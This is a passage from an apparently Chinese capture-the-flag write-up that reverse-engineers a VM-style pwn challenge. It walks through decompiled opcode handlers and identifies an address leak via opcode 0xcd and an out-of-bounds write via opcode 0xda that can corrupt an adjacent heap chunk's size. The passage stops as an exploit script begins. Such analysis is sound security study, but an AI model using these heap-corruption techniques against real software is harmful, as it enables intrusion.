__int8)code == <span class=\"number\">0x6A</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          *(_BYTE *)sRSP -= BYTE1(s);           <span class=\"comment\">// [rsp] - [code]</span></span><br><span class=\"line\">          rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *(_BYTE *)sRSP = BYTE1(s);</span><br><span class=\"line\">    rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">54</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_BYTE *)sRSP = sub_CBE();                 <span class=\"comment\">// push 1 bytes</span></span><br><span class=\"line\">    rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x36</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x45</span> )        <span class=\"comment\">// push 4byte</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE1(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE2(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE3(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE4(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x45</span>u )   <span class=\"comment\">// BYTEx是对64位code进行拆分,0为最低位</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">73</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (BYTE2(s) &lt;&lt; <span class=\"number\">8</span>) + (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)BYTE1(s) &lt;= size_X &amp;&amp; (BYTE4(s) &lt;&lt; <span class=\"number\">8</span>) + (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)BYTE3(s) &lt;= size_Y )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          x_temp = (BYTE2(s) &lt;&lt; <span class=\"number\">8</span>) + BYTE1(s);</span><br><span class=\"line\">          y_temp = (BYTE4(s) &lt;&lt; <span class=\"number\">8</span>) + BYTE3(s);  <span class=\"comment\">// 设置下一个start的位置，相当于jmp</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">82</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        *(_BYTE *)sRSP += BYTE1(s);</span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">65</span> &amp;&amp; BYTE1(s) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)sRSP = *(<span class=\"type\">char</span> *)sRSP / (__int16)BYTE1(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( (<span class=\"type\">unsigned</span> __int8)code )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">0x13</span>u:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( chance &lt;= <span class=\"number\">0</span> )                      <span class=\"comment\">// 重置</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        set_code_data();</span><br><span class=\"line\">        sub_E91();</span><br><span class=\"line\">        --chance;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">0x33</span>u:</span><br><span class=\"line\">        *(_BYTE *)sRSP ^= BYTE1(s);</span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">0x12</span>u:</span><br><span class=\"line\">        *(_BYTE *)sRSP *= BYTE1(s);</span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">LABEL_55:</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> ( HIBYTE(s) )                          <span class=\"comment\">// 最后一字节</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">-1</span>);                          <span class=\"comment\">// x-1,y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">0</span>, <span class=\"number\">-1</span>);                           <span class=\"comment\">// y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">-1</span>);                           <span class=\"comment\">// x+1，y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">0</span>);                           <span class=\"comment\">// x-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">6</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">0</span>);                            <span class=\"comment\">// x+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">7</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">1</span>);                           <span class=\"comment\">// x-1,y+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">8</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">0</span>, <span class=\"number\">1</span>);                            <span class=\"comment\">// y+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">9</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">1</span>);                            <span class=\"comment\">// x+1,y+1</span></span><br><span class=\"line\">LABEL_65:</span><br><span class=\"line\">      result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;End!&quot;</span>);</span><br><span class=\"line\">      result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看着这一摊东西，忍不住骂娘。</p>\n<p>先看最简单的，如何实现移动，也就是对 x,y 的操作</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">switch</span> ( HIBYTE(s) )                          <span class=\"comment\">// 最后一字节</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">-1</span>);                          <span class=\"comment\">// x-1,y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">0</span>, <span class=\"number\">-1</span>);                           <span class=\"comment\">// y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">-1</span>);                           <span class=\"comment\">// x+1，y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">0</span>);                           <span class=\"comment\">// x-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">6</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">0</span>);                            <span class=\"comment\">// x+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">7</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">1</span>);                           <span class=\"comment\">// x-1,y+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">8</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">0</span>, <span class=\"number\">1</span>);                            <span class=\"comment\">// y+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">9</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">1</span>);                            <span class=\"comment\">// x+1,y+1</span></span><br><span class=\"line\">LABEL_65:</span><br><span class=\"line\">      result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;End!&quot;</span>);</span><br><span class=\"line\">      result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure>\n<p>这里的 s 就是我们的 code，首先这个 HIBYTE 就烦人，一开始对所有的 BYTE 都不理解。这里呢会根据传进去的数据，返回 16 进制数的最高位，也就是说会返回我们写入的 code 第 8 字节，联系上问提到的，顺序取值，只要修改 x, 即令 code 的最高位为 6。</p>\n<p>除去这部分，就是对指令代码的解析，最低字节为操作码，其余为数据。先说明下怎么操作，大部分都是对栈顶中的数据进行操作，（这点我有些不理解，因为这栈顶的数据应该都是 0 啊。）然后操作码大致被分为三类，小于 0x36, 小于 0x54, 大于 0x54</p>\n<p>小于等于 0x36 的这部分</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">switch</span> ( (<span class=\"type\">unsigned</span> __int8)code )</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"number\">0x13</span>u:</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ( chance &lt;= <span class=\"number\">0</span> )                      <span class=\"comment\">// 重置code和初始xy位置</span></span><br><span class=\"line\">         <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">       set_code_data();</span><br><span class=\"line\">       sub_E91();</span><br><span class=\"line\">       --chance;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"number\">0x33</span>u:</span><br><span class=\"line\">       *(_BYTE *)sRSP ^= BYTE1(s);\t\t\t\t<span class=\"comment\">//异或</span></span><br><span class=\"line\">       rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">       <span class=\"keyword\">break</span>;</span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"number\">0x12</span>u:</span><br><span class=\"line\">       *(_BYTE *)sRSP *= BYTE1(s);\t\t\t\t<span class=\"comment\">//乘法</span></span><br><span class=\"line\">       rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">       <span class=\"keyword\">break</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x36</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   *(_BYTE *)sRSP = sub_CBE();                 <span class=\"comment\">// push 1 bytes</span></span><br><span class=\"line\">   rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>大于 0x36，小于 0x54 的部分</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x36</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x45</span> )        <span class=\"comment\">// push 4byte</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE1(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE2(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE3(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE4(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x45</span>u )   <span class=\"comment\">// BYTEx是对64位code进行拆分,0为最低位</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">73</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (BYTE2(s) &lt;&lt; <span class=\"number\">8</span>) + (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)BYTE1(s) &lt;= size_X &amp;&amp; (BYTE4(s) &lt;&lt; <span class=\"number\">8</span>) + (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)BYTE3(s) &lt;= size_Y )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          x_temp = (BYTE2(s) &lt;&lt; <span class=\"number\">8</span>) + BYTE1(s);</span><br><span class=\"line\">          y_temp = (BYTE4(s) &lt;&lt; <span class=\"number\">8</span>) + BYTE3(s);  <span class=\"comment\">// 设置下一个start的位置，相当于jmp</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x52</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        *(_BYTE *)sRSP += BYTE1(s);</span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x41</span> &amp;&amp; BYTE1(s) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)sRSP = *(<span class=\"type\">char</span> *)sRSP / (__int16)BYTE1(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>大于等于 0x54 的部分</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x54</span> )          <span class=\"comment\">// 输出栈顶数据一字节</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&#123;%c&#125;&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*(<span class=\"type\">char</span> *)sRSP);</span><br><span class=\"line\">  <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x54</span>u )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xCC</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    pop_(<span class=\"number\">1u</span>);                                 <span class=\"comment\">// 数值与初始值相比，大于等于1，现在的数值就减一</span></span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0xCC</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code != <span class=\"number\">0xD0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0xD0</span>u )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xD1</span> )  <span class=\"comment\">// 结束</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xDA</span> &amp;&amp; *(<span class=\"type\">int</span> *)((<span class=\"type\">char</span> *)&amp;s + <span class=\"number\">1</span>) &lt; size_X * size_Y )<span class=\"comment\">// 只检查了offset是否大于边界，但是未考虑到rsp,数组越界</span></span><br><span class=\"line\">          *(_BYTE *)(sRSP + *(<span class=\"type\">int</span> *)((<span class=\"type\">char</span> *)&amp;s + <span class=\"number\">1</span>)) = BYTE5(s);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xCD</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        buf = <span class=\"built_in\">malloc</span>(BYTE1(s));               <span class=\"comment\">// malloc (0xe0)</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">        n = read(<span class=\"number\">0</span>, buf, BYTE1(s));           <span class=\"comment\">// read 0xcd</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( n &gt; <span class=\"number\">0</span> &amp;&amp; *((_BYTE *)buf + n - <span class=\"number\">1</span>) == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">          *((_BYTE *)buf + n - <span class=\"number\">1</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You say \\&quot;%s\\&quot;\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)buf);<span class=\"comment\">// 泄露地址</span></span><br><span class=\"line\">        <span class=\"built_in\">free</span>(buf);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x98</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      pop_(<span class=\"number\">4u</span>);                               <span class=\"comment\">// pop （int）</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code != <span class=\"number\">0xCA</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x6A</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        *(_BYTE *)sRSP -= BYTE1(s);           <span class=\"comment\">// [rsp] - [code]</span></span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *(_BYTE *)sRSP = BYTE1(s);</span><br><span class=\"line\">  rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">  <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>基本的运算都是字节进行操作，</p>\n<ul>\n<li>0x12 乘法运算</li>\n<li>0x13 重置 code,x,y，只有一次机会，利用的是原来的空间</li>\n<li>0x33 异或运算</li>\n<li>0x36 push 一字节的数据，数据来源于输入，我们输入 48 字节的数据，但是只用一字节，</li>\n<li>0x41 除法运算</li>\n<li>0x45 push 4 字节的数据</li>\n<li>0x49 设置 x,y, 跳转至目标位置 code，第 2，3 字节用于 x，4，5 字节用于 y。</li>\n<li>0x52 加法运算</li>\n<li>0x54 输出一字节栈顶的数据</li>\n<li>0x6a 减法运算</li>\n<li>0x98 pop 4 字节的数据</li>\n<li>0xcc pop 一字节的数据</li>\n<li>0xcd 读入 content 并且输出，虽然检查换行，但是满输入可以泄露地址。malloc 的参数只有一字节，所以 chunk 的大小为 0x20-0xf0。free 后没有情空指针。但是未发现 uaf</li>\n<li>0xd1 程序结束</li>\n<li>0xda rsp+offset 的位置写一字节的数据。这里存在数组越界，因为只会检查 offset 是否超过 X*Y 的范围，但是没有考虑到如果加上 rsp   的条件</li>\n</ul>\n<p>因为他这个栈顶是有点问题的，栈空间已经被初始化为空的，大部分操作都会对 rsp+1，所以理论上栈顶的数据都是空的，一次 pop 也是空的。pop 要满足里面至少有一个数据，rsp-rbp&gt;=1, 但是 push 的操作不会检查是否溢出和越界。pop 只会更改 rsp 指向，但不会改变原始数据。</p>\n<p>这个题最大问题就在与 0xda，正常来说，我们应该只能改变他所定义的那个类似于栈的空间的数据，那么应该是 rbp+offset，但是这里写的是 rsp，就导致了，如果我们的 XN*YN 比较大，offset 可以轻松绕过检查，但是我们将他的 stack 填充很多垃圾，rsp 距离下一个堆块比较近，就导致了 rsp+offset 越界了，起码可以修改到下一个 chunk 的 size。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 